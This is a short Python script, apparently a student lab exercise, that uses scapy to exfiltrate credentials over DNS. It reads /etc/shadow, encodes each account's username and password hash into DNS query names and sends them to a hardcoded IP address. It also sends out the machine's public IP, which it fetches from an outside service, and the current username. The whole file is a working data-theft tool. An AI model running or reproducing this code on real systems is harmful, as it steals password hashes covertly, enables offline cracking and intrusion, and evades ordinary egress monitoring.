# Anna Sandler 208749648
# !/usr/bin/env python

import getpass
from requests import get
from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, IP
from scapy.layers.inet import UDP

DNS_ip = "10.0.2.15"  # TODO change

ip = get('https://api.ipify.org').text
user = getpass.getuser()  # current username

f = open("/etc/shadow", "r")
file = f.read()
f.close()

list = file.split("\n")

for i in range(len(list) - 1):
    current = list[i].split(":")
    if current[1] != '*':
        packet = IP(dst=DNS_ip) / UDP() / DNS(
            qd=DNSQR(qname="www." + current[0] + "." + current[1] + ".com", qtype="A"))
        send(packet, verbose=False)

send(IP(dst=DNS_ip) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="www." + ip + ".com")), verbose=0)
send(IP(dst=DNS_ip) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="www." + user + ".com")), verbose=0)
